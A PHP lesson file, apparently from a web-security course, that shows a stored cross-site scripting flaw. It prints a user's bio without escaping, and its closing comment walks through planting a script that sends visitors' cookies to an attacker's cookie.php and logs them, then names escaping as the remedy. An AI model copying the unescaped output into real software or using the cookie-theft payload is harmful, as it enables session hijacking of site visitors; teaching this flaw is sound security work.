<?php
$DB_HOST = 'localhost';
$DB_USER = 'root';
$DB_PASS = 'secret';
$DB_NAME = 'camshow_db';

//$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
//if (!$conn) {
//    die("Connection failed: " . mysqli_connect_error());
//} else {
//    echo 'connected';
//}

$date = new DateTime('+1 week');
setcookie('session', 'abcd', $date->getTimestamp());

try {
    $db = new PDO('mysql:host=' . $DB_HOST . ';dbname=' . $DB_NAME, $DB_USER, $DB_PASS);
    echo 'connected';
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
}

if (!isset($_GET['username'])) {
    die();
}

$user = $db->prepare("SELECT * FROM users_security WHERE username=:username");

$user->execute([
    'username' => $_GET['username']
]);

$user = $user->fetchObject();

//var_dump($user);

function escape($s) {
    //return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}
?>

<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <h2>username: <?php echo $user->username ?></h2>
        <p>bio: <?php echo $user->bio ?></p>
    </body>
</html>

<!-- 
    1-write on database the following on alex bio (who is the attacket): 

        <script> 

        document.location='http://localhost/_projetos/PHP_security/codecourse/codecourse-10-lessons/2-attacker/cookie.php?cookie='+document.cookie; 

        </script>  

        this way a visitor that goes to see alex bio will be redirected to cookie.php


    
    2-confirm there is a cookie on resources  

        this cookie can represent any token


    3-create attacker/cookie.php and imagine that this file is on a different server  

    4-check log.txt with the cookies


    5-solutions:

        -escape data before going to db (use function escape)
-->

